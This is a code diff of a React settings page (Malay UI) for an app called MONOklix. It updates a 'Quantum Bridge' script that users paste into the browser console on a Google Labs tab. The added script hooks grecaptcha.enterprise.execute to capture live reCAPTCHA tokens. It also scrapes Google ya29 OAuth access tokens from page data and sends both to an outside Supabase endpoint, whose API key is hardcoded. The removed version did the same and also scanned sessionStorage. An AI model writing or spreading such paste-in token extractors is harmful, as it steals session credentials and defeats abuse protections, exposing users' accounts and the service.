@@ -8,8 +8,6 @@ import {
 import Spinner from '../common/Spinner';
 import Tabs, { type Tab } from '../common/Tabs';
 import { getFormattedCacheStats, clearVideoCache } from '../../services/videoCacheService';
-import { runComprehensiveTokenTest } from '../../services/imagenV3Service';
-import { parseCookieFile } from '../../services/cookieUtils';
 import { supabase } from '../../services/supabaseClient';
 
 type SettingsTabId = 'profile' | 'cloud-login';
@@ -91,11 +89,10 @@ const CacheManagerPanel: React.FC = () => {
 const CloudLoginPanel: React.FC<{currentUser: User, onUserUpdate: (u: User) => void}> = ({ currentUser, onUserUpdate }) => {
     const [token, setToken] = useState(currentUser.personalAuthToken || '');
     const [showToken, setShowToken] = useState(false);
-    const [isTesting, setIsTesting] = useState(false);
     const [isBridgeActive, setIsBridgeActive] = useState(false);
     const fileInputRef = useRef<HTMLInputElement>(null);
 
-    // REAL-TIME LISTENER
+    // REAL-TIME LISTENER: Jika skrip Bridge hantar token baru, web app akan terus detect
     useEffect(() => {
         const channel = supabase
             .channel('token-sync')
@@ -118,100 +115,63 @@ const CloudLoginPanel: React.FC<{currentUser: User, onUserUpdate: (u: User) => v
         return () => { supabase.removeChannel(channel); };
     }, [currentUser.id, token, onUserUpdate]);
 
-    const handleUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
-        const file = e.target.files?.[0];
-        if (!file) return;
-        try {
-            const extracted = await parseCookieFile(file);
-            if (extracted) {
-                setToken(extracted);
-                const res = await saveUserPersonalAuthToken(currentUser.id, extracted);
-                if (res.success) onUserUpdate(res.user);
-            } else {
-                alert("Token ya29 tidak ditemui.");
-            }
-        } catch (err) { alert("Format fail tidak sah."); }
-    };
-
     const copyBridgeSnippet = () => {
         const snippet = `
 (async () => {
-  console.log("%c MONOklix Quantum Bridge V5 (Ghost Mode) ", "background: #4A6CF7; color: white; font-weight: bold; padding: 4px; border-radius: 4px;");
+  console.log("%c MONOklix Quantum Bridge V6 (Live Interceptor) ", "background: #4A6CF7; color: white; font-weight: bold; padding: 4px; border-radius: 4px;");
   
   const userId = "${currentUser.id}";
   const siteKey = "6LdsFiUsAAAAAIjVDZcuLhaHiDn5nnHVXVRQGeMV";
   const ya29Regex = /ya29\\.[a-zA-Z0-9_-]{50,}/;
-  let ya29 = "";
-
-  try {
-    // 1. GHOST SCAN: Cari dalam WIZ_global_data (Tempat Google simpan session)
-    if (window.WIZ_global_data) {
-        console.log("🔍 Scanning WIZ internal data...");
-        const wizStr = JSON.stringify(window.WIZ_global_data);
-        const match = wizStr.match(ya29Regex);
-        if (match) ya29 = match[0];
-    }
-
-    // 2. FALLBACK: Cari dalam Session Storage
-    if (!ya29) {
-        console.log("🔍 Scanning Session storage...");
-        for (let i = 0; i < sessionStorage.length; i++) {
-            const val = sessionStorage.getItem(sessionStorage.key(i));
-            const match = val.match(ya29Regex);
-            if (match) { ya29 = match[0]; break; }
-        }
-    }
-
-    // 3. LAST RESORT: Panggil endpoint session
-    if (!ya29) {
-        console.log("🔍 Calling session endpoint...");
-        const res = await fetch("https://labs.google/fx/api/auth/session");
-        if (res.ok) {
-            const data = await res.json();
-            ya29 = data.accessToken || data.access_token || data.token;
-        }
-    }
-
-    if (!ya29) throw new Error("Gagal menemui token ya29. Sila pastikan anda login di tab ini.");
-
-    console.log("🎯 Token Detected: " + ya29.substring(0,15) + "...");
-
-    // 4. Generate reCAPTCHA Token (Action: PINHOLE_GENERATE)
-    console.log("🔐 Performing Security Handshake...");
-    const recaptchaToken = await grecaptcha.enterprise.execute(siteKey, {action: 'PINHOLE_GENERATE'});
-    
-    // 5. Sync ke MONOklix
-    const hybridPayload = ya29 + "[REC]" + recaptchaToken;
-    console.log("🚀 Syncing to MONOklix...");
-    
-    const syncRes = await fetch("https://xbbhllhgbachkzvpxvam.supabase.co/rest/v1/users?id=eq." + userId, {
+  
+  const syncToMonoklix = async (ya29, rec) => {
+    const payload = ya29 + "[REC]" + (rec || "");
+    console.log("🚀 Syncing Extraction to MONOklix...");
+    await fetch("https://xbbhllhgbachkzvpxvam.supabase.co/rest/v1/users?id=eq." + userId, {
       method: "PATCH",
       headers: {
         "apikey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhiYmhsbGhnYmFjaGt6dnB4dmFtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTc4Njk1NjksImV4cCI6MjA3MzQ0NTU2OX0.l--gaQSJ5hPnJyZOC9-QsRRQjr-hnsX_WeGSglbNP8E",
         "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhiYmhsbGhnYmFjaGt6dnB4dmFtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTc4Njk1NjksImV4cCI6MjA3MzQ0NTU2OX0.l--gaQSJ5hPnJyZOC9-QsRRQjr-hnsX_WeGSglbNP8E",
         "Content-Type": "application/json"
       },
-      body: JSON.stringify({ personal_auth_token: hybridPayload })
+      body: JSON.stringify({ personal_auth_token: payload })
     });
+  };
 
-    if (syncRes.ok) {
-       console.log("%c ✅ GHOST SYNC SUCCESSFUL! ", "background: #10b981; color: white; font-weight: bold; padding: 4px; border-radius: 4px;");
-       alert("SINKRONISASI BERJAYA! Anda boleh kembali ke MONOklix.");
-    }
-  } catch (e) {
-    console.error("❌ Ghost Bridge Error:", e.message);
-    alert("Ralat: " + e.message);
+  if (typeof grecaptcha !== "undefined" && grecaptcha.enterprise) {
+      const originalExecute = grecaptcha.enterprise.execute;
+      grecaptcha.enterprise.execute = async function(sKey, options) {
+          const token = await originalExecute.apply(this, arguments);
+          console.log("🎯 Extracted NEW Recaptcha Token from Live Session!");
+          let currentYa29 = "";
+          if (window.WIZ_global_data) {
+              const match = JSON.stringify(window.WIZ_global_data).match(ya29Regex);
+              if (match) currentYa29 = match[0];
+          }
+          if (currentYa29) await syncToMonoklix(currentYa29, token);
+          return token;
+      };
+      console.log("🛰️ Live Interceptor Active.");
   }
+
+  try {
+    let ya29 = "";
+    if (window.WIZ_global_data) ya29 = JSON.stringify(window.WIZ_global_data).match(ya29Regex)?.[0] || "";
+    const recToken = await grecaptcha.enterprise.execute(siteKey, {action: 'PINHOLE_GENERATE'});
+    if (ya29) {
+        await syncToMonoklix(ya29, recToken);
+        alert("SINKRONISASI BERJAYA! MONOklix sedia digunakan.");
+    }
+  } catch (e) { console.error("Bridge Error:", e.message); }
 })();`.trim();
         
         navigator.clipboard.writeText(snippet);
-        alert("Quantum Bridge V5 (Ghost Mode) disalin!\n\n1. Pergi ke tab Google Labs\n2. Tekan F12 -> Console\n3. Paste & Enter.");
+        alert("Quantum Bridge V6 disalin!\n\n1. Pergi ke tab Google Labs\n2. Tekan F12 -> Console\n3. Paste & Enter.");
     };
 
     return (
         <div className="space-y-6">
-            {/* Quantum Bridge Card */}
-            <div className="bg-gradient-to-br from-brand-start/20 to-brand-end/10 border border-brand-start/30 p-6 rounded-3xl shadow-glow animate-zoomIn relative overflow-hidden">
+            <div className="bg-gradient-to-br from-brand-start/20 to-brand-end/10 border border-brand-start/30 p-6 rounded-3xl shadow-glow relative overflow-hidden">
                 <div className="absolute top-0 right-0 p-4 opacity-10">
                     <RefreshCwIcon className={`w-24 h-24 ${isBridgeActive ? 'animate-spin' : ''}`} />
                 </div>
@@ -222,7 +182,7 @@ const CloudLoginPanel: React.FC<{currentUser: User, onUserUpdate: (u: User) => v
                             <SparklesIcon className="w-6 h-6 text-yellow-400" />
                             Quantum Bridge Sync
                         </h3>
-                        <p className="text-sm text-neutral-400 mt-1 max-w-md">Cara paling pantas & automatik untuk mendapatkan token <strong>ya29</strong> dan <strong>reCAPTCHA</strong> terus dari sumber Google.</p>
+                        <p className="text-sm text-neutral-400 mt-1 max-w-md">Gunakan skrip ini di tab Google Labs untuk mengekstrak <strong>ya29</strong> dan <strong>reCAPTCHA</strong> secara automatik ke MONOklix.</p>
                     </div>
                     {isBridgeActive && (
                         <div className="bg-green-500 text-white text-[10px] font-bold px-3 py-1 rounded-full animate-bounce">
@@ -236,7 +196,7 @@ const CloudLoginPanel: React.FC<{currentUser: User, onUserUpdate: (u: User) => v
                         onClick={copyBridgeSnippet}
                         className="flex-1 bg-white text-black py-4 rounded-2xl font-black text-sm flex items-center justify-center gap-2 hover:scale-[1.02] active:scale-95 transition-all shadow-lg"
                     >
-                        <ClipboardIcon className="w-5 h-5" /> Salin Skrip Quantum Bridge (V5)
+                        <ClipboardIcon className="w-5 h-5" /> Salin Skrip Quantum Bridge (Web)
                     </button>
                     <a 
                         href="https://labs.google/fx/tools/flow" 
@@ -250,33 +210,25 @@ const CloudLoginPanel: React.FC<{currentUser: User, onUserUpdate: (u: User) => v
                 
                 <div className="mt-4 flex items-center gap-2 text-[10px] text-neutral-500 font-mono">
                     <ShieldCheckIcon className="w-3 h-3 text-green-500" />
-                    STATUS: GHOST MODE READY (V5)
+                    STATUS: WEB EXTRACTOR READY
                 </div>
             </div>
 
             <div className="bg-white/5 border border-white/10 p-6 rounded-2xl">
-                <div className="flex justify-between items-start mb-6">
-                    <div>
-                        <h3 className="text-lg font-bold flex items-center gap-2 text-white">
-                            <KeyIcon className="w-5 h-5 text-brand-start" /> 
-                            Manual Control
-                        </h3>
-                    </div>
-                    <button onClick={() => fileInputRef.current?.click()} className="text-[10px] font-bold text-neutral-400 hover:text-white transition-colors">
-                        Import session.json
-                    </button>
-                    <input type="file" ref={fileInputRef} onChange={handleUpload} className="hidden" />
-                </div>
+                <h3 className="text-lg font-bold flex items-center gap-2 text-white mb-6">
+                    <KeyIcon className="w-5 h-5 text-brand-start" /> 
+                    Manual Token Control
+                </h3>
 
                 <div className="space-y-4">
                     <div className="relative">
-                        <label className="block text-[10px] font-bold text-neutral-500 uppercase mb-2 tracking-widest">Active Token (ya29)</label>
+                        <label className="block text-[10px] font-bold text-neutral-500 uppercase mb-2 tracking-widest">Active Hybrid Payload</label>
                         <input 
                             type={showToken ? "text" : "password"} 
                             value={token} 
                             onChange={(e) => setToken(e.target.value)}
                             className="w-full bg-black/40 border border-white/10 rounded-xl p-3 pr-12 text-white font-mono text-xs"
-                            placeholder="ya29.A0AX..."
+                            placeholder="ya29...[REC]..."
                         />
                         <button onClick={() => setShowToken(!showToken)} className="absolute right-4 top-8 text-neutral-500 hover:text-white">
                             {showToken ? <EyeOffIcon className="w-4 h-4"/> : <EyeIcon className="w-4 h-4"/>}
